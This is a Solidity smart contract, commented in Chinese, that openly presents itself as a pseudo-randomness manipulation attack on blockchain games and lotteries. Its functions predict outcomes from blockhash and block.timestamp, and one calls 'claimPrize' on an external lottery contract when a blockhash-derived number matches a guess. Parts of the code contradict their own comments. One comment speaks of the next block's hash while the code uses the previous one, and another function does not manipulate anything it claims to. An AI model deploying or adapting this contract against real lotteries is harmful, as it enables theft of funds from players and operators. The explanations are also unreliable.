// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title RandomnessAttack
 * @notice 伪随机数操纵攻击
 * @dev 利用blockhash/timestamp等可预测源
 */
contract RandomnessAttack {
    address public owner;

    struct Game {
        uint256 bet;
        uint256 targetBlock;
        bool resolved;
        address player;
    }

    mapping(uint256 => Game) public games;
    uint256 public gameId;

    event GameCreated(uint256 id, address player, uint256 bet);
    event GameManipulated(uint256 id, uint256 fakeRandom);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 创建基于区块哈希的游戏（可预测）
     */
    function createGame() external payable {
        require(msg.value > 0, "Need bet");
        uint256 id = gameId++;
        games[id] = Game(msg.value, block.number + 1, false, msg.sender);
        emit GameCreated(id, msg.sender, msg.value);
    }

    /**
     * @notice 利用可预测的blockhash操纵结果
     */
    function predictAndAttack(uint256 targetGameId) external {
        Game storage game = games[targetGameId];
        require(!game.resolved, "Already resolved");
        require(block.number > game.targetBlock, "Too early");
        require(block.number <= game.targetBlock + 256, "Blockhash expired");

        // 计算"随机数"（实际上完全可预测）
        uint256 predictableRandom = uint256(blockhash(game.targetBlock));

        // 如果预测到自己会赢，提前下注或操纵
        if (predictableRandom % 2 == 0) {
            game.resolved = true;
            emit GameManipulated(targetGameId, predictableRandom);
        }
    }

    /**
     * @notice 利用timestamp的可预测性
     */
    function timestampAttack() external view returns (bool) {
        // block.timestamp可被矿工操纵±15秒
        uint256 manipulatedTime = block.timestamp;
        return (manipulatedTime % 10 == 0);
    }

    /**
     * @notice 前置运行攻击：看到pending交易后抢先提交
     */
    function frontRunLottery(address lottery, uint256 guess) external {
        // 如果彩票使用blockhash，可以计算下一个区块的hash并抢先
        bytes32 nextHash = blockhash(block.number - 1);
        uint256 winningNumber = uint256(nextHash) % 100;

        if (winningNumber == guess) {
            // 提交获胜答案
            (bool success, ) = lottery.call(abi.encodeWithSignature("claimPrize(uint256)", guess));
            require(success, "Claim failed");
        }
    }
}
